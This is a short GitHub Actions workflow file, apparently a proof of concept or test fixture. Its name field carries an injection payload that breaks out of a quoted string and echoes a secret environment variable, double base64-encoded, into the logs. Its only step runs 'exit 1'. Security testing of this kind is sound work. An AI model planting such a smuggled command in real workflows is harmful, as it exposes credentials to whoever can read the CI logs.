name: 'Linux"; echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"; echo "'
on:
  pull_request:
    paths:
    - .github/workflows/linux.yml
permissions:
  contents: read
jobs:
  build:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
    - name: Fail fast
      run: exit 1
